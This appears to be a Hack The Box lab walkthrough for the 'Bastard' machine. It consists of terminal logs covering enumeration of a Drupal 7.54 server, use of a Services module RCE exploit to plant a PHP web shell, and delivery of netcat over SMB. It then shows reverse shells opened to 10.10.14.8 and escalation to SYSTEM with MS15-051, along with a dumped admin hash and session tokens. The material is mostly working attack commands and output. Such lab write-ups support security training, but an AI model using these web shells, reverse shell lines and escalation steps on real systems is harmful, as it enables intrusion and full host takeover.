@@ -1,0 +1,414 @@
+RECON
+root@kali:~/htb/bastard# nmap -sC -sV -p- -vv -oA full 10.10.10.9
+PORT      STATE SERVICE REASON          VERSION
+80/tcp    open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
+|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 36 disallowed entries 
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
+| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
+| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
+| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
+|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
+135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
+49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+ENUM
+WEB DRUPAL SERVER
+root@kali:~/htb/bastard# nmap -p 80 --script http-drupal-enum 10.10.10.9
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-05 15:59 EST
+Nmap scan report for 10.10.10.9
+Host is up (0.022s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-drupal-enum: 
+|   Modules: 
+|     ctools
+|_    libraries
+
+Nmap done: 1 IP address (1 host up) scanned in 456.97 seconds
+
+root@kali:~/droopescan# droopescan scan drupal -u http://10.10.10.9/ -t 32
+[+] Themes found:                                                               ^?
+    seven http://10.10.10.9/themes/seven/
+    garland http://10.10.10.9/themes/garland/
+
+[+] Possible interesting urls found:
+    Default changelog file - http://10.10.10.9/CHANGELOG.txt
+    Default admin - http://10.10.10.9/user/login
+
+[+] Possible version(s):
+    7.54
+
+[+] Plugins found:
+    ctools http://10.10.10.9/sites/all/modules/ctools/
+        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
+        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
+        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
+        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
+        http://10.10.10.9/sites/all/modules/ctools/API.txt
+    libraries http://10.10.10.9/sites/all/modules/libraries/
+        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
+        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
+        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
+        http://10.10.10.9/sites/all/modules/libraries/README.txt
+        http://10.10.10.9/sites/all/modules/libraries/readme.txt
+        http://10.10.10.9/sites/all/modules/libraries/README.TXT
+        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
+    services http://10.10.10.9/sites/all/modules/services/
+        http://10.10.10.9/sites/all/modules/services/README.txt
+        http://10.10.10.9/sites/all/modules/services/readme.txt
+        http://10.10.10.9/sites/all/modules/services/README.TXT
+        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
+    profile http://10.10.10.9/modules/profile/
+    php http://10.10.10.9/modules/php/
+    image http://10.10.10.9/modules/image/
+
+SEARCH EXPLOIT
+root@kali:~/htb/bastard# searchsploit drupal 7
+------------------------------------------------------- ----------------------------------------
+ Exploit Title                                         |  Path
+                                                       | (/usr/share/exploitdb/)
+------------------------------------------------------- ----------------------------------------
+Drupal 4.7 - 'Attachment mod_mime' Remote Command Exec | exploits/php/webapps/1821.php
+Drupal 4.x - URL-Encoded Input HTML Injection          | exploits/php/webapps/27020.txt
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add  | exploits/php/webapps/34992.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admi | exploits/php/webapps/44355.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) | exploits/php/webapps/34984.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) | exploits/php/webapps/34993.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remo | exploits/php/webapps/35150.php
+Drupal 7.12 - Multiple Vulnerabilities                 | exploits/php/webapps/18564.txt
+Drupal 7.x Module Services - Remote Code Execution     | exploits/php/webapps/41564.php
+Drupal < 4.7.6 - Post Comments Remote Command Executio | exploits/php/webapps/3313.pl
+Drupal < 5.22/6.16 - Multiple Vulnerabilities          | exploits/php/webapps/33706.txt
+Drupal < 7.34 - Denial of Service                      | exploits/php/dos/35415.txt
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote | exploits/php/webapps/44557.rb
+Drupal < 7.58 - 'drupalgeddon3' (Authenticated) Remote | exploits/php/webapps/44542.txt
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalg | exploits/php/webapps/44449.rb
+Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - | exploits/php/webapps/25493.txt
+Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Ex | exploits/php/remote/40144.php
+Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cro | exploits/php/webapps/35397.txt
+Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.ph | exploits/php/webapps/37453.php
+Drupal Module Embedded Media Field/Media 6.x : Video F | exploits/php/webapps/35072.txt
+Drupal Module RESTWS 7.x - PHP Remote Code Execution ( | exploits/php/remote/40130.rb
+Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File | exploits/php/webapps/44501.txt
+
+USE THIS EXPLOIT
+Drupal 7.x Module Services - Remote Code Execution     | exploits/php/webapps/41564.php
+https://www.exploit-db.com/exploits/41564
+
+EDIT THE PHP SCRIPT
+root@kali:~/htb/bastard# vim bshell.php 
+**NOTE** Lines 24 and 60 have unquoted letters
+$url = 'http://10.10.10.9';
+$endpoint_path = '/rest';
+$endpoint = 'rest_endpoint';
+
+$file = [
+    'filename' => 'bshell.php',
+    'data' => '<?php system($_REQUEST["cmd"]); ?>'
+];
+
+root@kali:~/htb/bastard# php bshell.php 
+# Exploit Title: Drupal 7.x Services Module Remote Code Execution
+# Vendor Homepage: https://www.drupal.org/project/services
+# Exploit Author: Charles FOL
+# Contact: https://twitter.com/ambionics 
+# Website: https://www.ambionics.io/blog/drupal-services-module-rce
+
+
+#!/usr/bin/php
+Stored session information in session.json
+Stored user information in user.json
+Cache contains 7 entries
+File written: http://10.10.10.9/bshell.php
+root@kali:~/htb/bastard# ls -l
+total 48
+-rw-r--r-- 1 root root 8684 Samh   5 17:29 41564.php
+-rw-r--r-- 1 root root 8642 Samh   5 18:04 bshell.php
+-rw-r--r-- 1 root root  484 Samh   5 15:23 full.gnmap
+-rw-r--r-- 1 root root 1689 Samh   5 15:23 full.nmap
+-rw-r--r-- 1 root root 4593 Samh   5 15:23 full.xml
+-rw-r--r-- 1 root root  187 Samh   5 18:04 session.json
+-rw-r--r-- 1 root root  799 Samh   5 18:04 user.json
+
+root@kali:~/htb/bastard# cat user.json 
+{
+    "uid": "1",
+    "name": "admin",
+    "mail": "drupal@hackthebox.gr",
+    "theme": "",
+    "created": "1489920428",
+    "access": "1492102672",
+    "login": 1604617737,
+    "status": "1",
+    "timezone": "Europe\/Athens",
+    "language": "",
+    "picture": null,
+    "init": "drupal@hackthebox.gr",
+    "data": false,
+    "roles": {
+        "2": "authenticated user",
+        "3": "administrator"
+    },
+    "rdf_mapping": {
+        "rdftype": [
+            "sioc:UserAccount"
+        ],
+        "name": {
+            "predicates": [
+                "foaf:name"
+            ]
+        },
+        "homepage": {
+            "predicates": [
+                "foaf:page"
+            ],
+            "type": "rel"
+        }
+    },
+    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
+}root@kali:~/htb/bastard# cat session.json 
+{
+    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
+    "session_id": "lRxZIb7IS0Wg4oHUPQkEA-UwLEIUwrpVTbAuuU2GjxQ",
+    "token": "KzLHA7ysZPjaf-l-e3oLeC7lQfu-QdZ6fGNSE-6n8Xo"
+
+
+TEST UPLOADED PHP SCRIPT
+http://10.10.10.9/bshell.php?cmd=dir
+ Volume Serial Number is 605B-4AAA
+
+ Directory of C:\inetpub\drupal-7.54
+
+06/11/2020  01:09 §£    <DIR>          .
+06/11/2020  01:09 §£    <DIR>          ..
+19/03/2017  12:42 ££               317 .editorconfig
+19/03/2017  12:42 ££               174 .gitignore
+19/03/2017  12:42 ££             5.969 .htaccess
+19/03/2017  12:42 ££             6.604 authorize.php
+06/11/2020  01:09 §£                34 bshell.php
+19/03/2017  12:42 ££           110.781 CHANGELOG.txt
+19/03/2017  12:42 ££             1.481 COPYRIGHT.txt
+19/03/2017  12:42 ££               720 cron.php
+19/03/2017  12:43 ££    <DIR>          includes
+19/03/2017  12:42 ££               529 index.php
+19/03/2017  12:42 ££             1.717 INSTALL.mysql.txt
+19/03/2017  12:42 ££             1.874 INSTALL.pgsql.txt
+19/03/2017  12:42 ££               703 install.php
+19/03/2017  12:42 ££             1.298 INSTALL.sqlite.txt
+19/03/2017  12:42 ££            17.995 INSTALL.txt
+19/03/2017  12:42 ££            18.092 LICENSE.txt
+19/03/2017  12:42 ££             8.710 MAINTAINERS.txt
+19/03/2017  12:43 ££    <DIR>          misc
+19/03/2017  12:43 ££    <DIR>          modules
+19/03/2017  12:43 ££    <DIR>          profiles
+19/03/2017  12:42 ££             5.382 README.txt
+19/03/2017  12:42 ££             2.189 robots.txt
+19/03/2017  12:43 ££    <DIR>          scripts
+19/03/2017  12:43 ££    <DIR>          sites
+19/03/2017  12:43 ££    <DIR>          themes
+19/03/2017  12:42 ££            19.986 update.php
+19/03/2017  12:42 ££            10.123 UPGRADE.txt
+19/03/2017  12:42 ££             2.200 web.config
+19/03/2017  12:42 ££               417 xmlrpc.php
+              22 File(s)        217.295 bytes
+               9 Dir(s)  30.808.113.152 bytes free
+
+http://10.10.10.9/bshell.php?cmd=systeminfo
+
+Host Name:                 BASTARD
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00496-001-0001283-84782
+Original Install Date:     18/3/2017, 7:04:46 ££
+System Boot Time:          6/11/2020, 1:03:54 §£
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     2.047 MB
+Available Physical Memory: 1.602 MB
+Virtual Memory: Max Size:  4.095 MB
+Virtual Memory: Available: 3.628 MB
+Virtual Memory: In Use:    467 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.9
+
+COPY NETCAT TO BASTARD
+root@kali:~/htb/bastard# cp /usr/share/windows-binaries/nc.exe .
+
+root@kali:~/impacket/impacket# impacket-smbserver share /root/htb/bastard/
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.9,49177)
+[*] AUTHENTICATE_MESSAGE (\,BASTARD)
+[*] User \BASTARD authenticated successfully
+[*] :::00::4141414141414141
+[-] Unknown level for query path info! 0x109
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:SHARE)
+[*] Handle: [Errno 104] Connection reset by peer
+[*] Closing down connection (10.10.10.9,49177)
+[*] Remaining connections []
+
+
+http://10.10.10.9/bshell.php?cmd=copy%20\\10.10.14.8\share\nc.exe%20nc.exe
+1 file(s) copied. 
+
+
+START REVERSE LISTENER
+root@kali:~/htb/bastard# cp nc.exe nc
+root@kali:~/htb/bastard# nc -lvp 53
+listening on [any] 53 ...
+
+
+TRIGGER NETCAT
+10.10.10.9/bshell.php?cmd=nc.exe 10.10.14.8 53 -e cmd.exe
+
+GET LOW PRIV SHELL
+root@kali:~/htb/bastard# nc -lvp 53
+listening on [any] 53 ...
+10.10.10.9: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 49178
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\inetpub\drupal-7.54>whoami
+whoami
+nt authority\iusr
+C:\inetpub\drupal-7.54>dir C:\Users\dimitris\Desktop
+dir C:\Users\dimitris\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 605B-4AAA
+
+ Directory of C:\Users\dimitris\Desktop
+
+19/03/2017  08:04 ��    <DIR>          .
+19/03/2017  08:04 ��    <DIR>          ..
+19/03/2017  08:06 ��                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  30.808.047.616 bytes free
+
+GET USER FLAG
+C:\inetpub\drupal-7.54>type C:\Users\dimitris\Desktop\user.txt
+type C:\Users\dimitris\Desktop\user.txt
+#######################################
+
+PRIVESC USING SYSTEMINFO AND WINDOWS EXPLOIT SUGGESTER
+
+root@kali:~/impacket/impacket# cd /root/Windows-Exploit-Suggester/
+root@kali:~/Windows-Exploit-Suggester# python windows-exploit-suggester.py --database 2020-11-04-mssb.xls --systeminfo /root/htb/bastard/sysinfo.txt 
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (utf-8)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 197 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 2008 R2 64-bit'
+[*] 
+[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
+[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
+[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
+[*] 
+[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
+[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+[*] done
+
+
+C:\inetpub\drupal-7.54>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name          Description                               State  
+======================= ========================================= =======
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects                     Enabled
+
+NEED A 64 BIT EXPLOIT FOR WIN 2008
+Microsoft Windows - Local Privilege Escalation (MS15-051) 
+https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
+
+RUN ms15-051x64 ON BASTARD
+\\10.10.14.8\share\ms15-051x64.exe "\\10.10.14.8\share\nc.exe -e cmd.exe 10.10.14.8 1234"
+
+GET ROOT SHELL
+root@kali:~/htb/bastard# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.9: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.9] 49191
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\inetpub\drupal-7.54>whoami
+whoami
+nt authority\system
+
+GET ROOT FLAG
+C:\inetpub\drupal-7.54>dir C:\Users\Administrator\Desktop
+dir C:\Users\Administrator\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 605B-4AAA
+
+ Directory of C:\Users\Administrator\Desktop
+
+19/03/2017  07:33 ��    <DIR>          .
+19/03/2017  07:33 ��    <DIR>          ..
+19/03/2017  07:34 ��                32 root.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  30.807.998.464 bytes free
+
+C:\inetpub\drupal-7.54>type C:\Users\Administrator\Desktop\root.txt.txt
+type C:\Users\Administrator\Desktop\root.txt.txt
+###########################
